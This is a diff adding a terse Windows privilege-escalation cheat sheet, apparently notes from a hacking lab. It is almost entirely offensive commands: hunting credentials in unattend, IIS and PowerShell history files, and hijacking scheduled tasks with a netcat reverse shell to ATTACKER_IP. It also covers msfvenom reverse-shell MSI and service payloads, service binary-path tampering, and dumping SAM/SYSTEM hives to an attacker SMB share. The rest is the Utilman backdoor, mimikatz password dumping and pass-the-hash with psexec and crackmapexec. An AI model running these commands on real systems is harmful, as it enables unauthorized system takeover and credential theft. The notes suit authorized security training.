@@ -1,0 +1,125 @@
+- unattended :
+    - C:\Unattend.xml
+    - C:\Windows\Panther\Unattend.xml
+    - C:\windows\Panther\autounattend.xml
+    - C:\Windows\Panther\Unattend\Unattend.xml
+    - C:\Windows\system32\sysprep.inf
+    - C:\Windows\system32\sysprep\sysprep.xml
+
+- powershell history file : 
+    - cmd : %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+- saved credentials : 
+    - list credentials : cmdkey /list
+    - run command with saved credentials : runas /savecred /user:USERNAME cmd.exe
+
+- IIS configuration : 
+    - configuration file : 
+        - C:\inetpub\wwwroot\web.config
+        - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+    - find the credentials : type PATH_IIS_CONFIG | findstr connectionString 
+
+- putty configuration : 
+    - proxy file : reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+- scheduled task : 
+    - cmd : schtasks /query /tn vulntask /fo list /v
+    - important : 
+        - task to run : the path to the task file
+        - run as user : user who will run the task
+    - check permissions of the task : 
+        - syntax : icacls PATH_TASK
+    - write simple netcat reverse shell : 
+        - echo PATH_TO_NC\nc64.exe -e cmd.exe ATTACKER_IP 4444 > PATH_TASK
+        - need nc lister 
+        - if can run the task : schtasks /run /tn TASK_NAME
+
+- AlwaysInstallElevated:
+    - requirements :
+        - C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+        - C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+    - payload : 
+        - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.165.124 LPORT=LOCAL_PORT -f msi -o malicious.msi
+    - run the payload: 
+        - syntax : C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+- windows services : 
+    - query service : sc qc SERVICE_NAME
+    - check permissions of the service : 
+        - syntax : icacls PATH_SERVICE
+    - payload : 
+        - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+    - give everyone full privilege :
+        - icacls WService.exe /grant Everyone:F
+    - restart service : 
+        - sc stop SERVICE_NAME
+        - sc start SERVICE_NAME
+    - if the path is an unsecured unquoted :
+        - copy the payload to the name of unquoted
+    - insecure service permissions : 
+        - check if a service can be edited :
+            - tool : accesschk64
+            - documentation : https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+            - syntax : accesschk64.exe -qlc thmservice
+        - grand everyone full access : icacls C:\Temp\payload.exe /grant Everyone:F
+        - edit service binary path : 
+            - syntax :  sc config SERVICE_NAME binPath= "C:\Temp\payload.exe" obj= LocalSystem
+        - restart the service
+
+- dangerous privileges : 
+    - SeBackup / SeRestore
+        - backup system and sam hashes : 
+            - cmd : 
+                - system : reg save hklm\system C:\Users\THMBackup\system.hive
+                - sam : reg save hklm\sam C:\Users\THMBackup\sam.hive
+        - copy files with smb server : 
+            - cmd : 
+                - mkdir share
+                - python3.9 /opt/impacket/examples/smbserver.py -smb2support -username CURRENT_WINDOWS_USERNAME -password CURRENT_WINDOWS_PASSWORD public share
+                - copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+                - copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+        - retrieve hashed : 
+            - syntax :  python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL(local is written as is)
+        
+        - authenticate with psexec : 
+            - python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
+    - SeTakeOwnership :
+        - cmd : 
+            - takeown /f C:\Windows\System32\Utilman.exe
+            - icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+            - copy cmd.exe utilman.exe
+        - force using utilman :
+            - lock the current session 
+            - click on the 'ease of access' button
+
+- mimikatz (required privileged session) :
+    - meterpreter :
+        - load kiwi : load mimikatz to the meterpreter session
+        - ? : show all options
+    - mimikatz executable :
+        - upload /usr/share/windows-ressources/mimikatz/x64/mimikatz.exe
+        - mimikatz shell :
+            - privilege::debug : check if the current session is privileged
+            - lsadump::sam : dump all the sam database  
+            - sekurlsa::logonpasswords : if exists, display all clear text logon passwords           
+    - RID 500 : Administrator account
+
+- pass the hash (uses SMB):
+    - tools : 
+        - crackmapexec
+        - psexec
+    - requirements : 
+        - LM hash (the same for all users) : hashdump from meterpreter
+        - NTLM hash (password hash) : hash get by hashdump or mimikatz
+    - msfconsole:
+        - exploit : windows/smb/psexec
+            - set SMBPass LM_HASH:NTLM_HASH
+            - SET target Native\ upload
+    - crackmapexec :
+        - syntax : 
+            - check : crackmapexec smb -u USERNAME -H NTLM_HASH 
+            - run command : crackmapexec smb -u USERNAME -H NTLM_HASH -x CMD
+
+- Unattend
+    - C:\Windows\Panther\Unattend.xml
+    - C:\Windows\Panther\Autounattend.xml
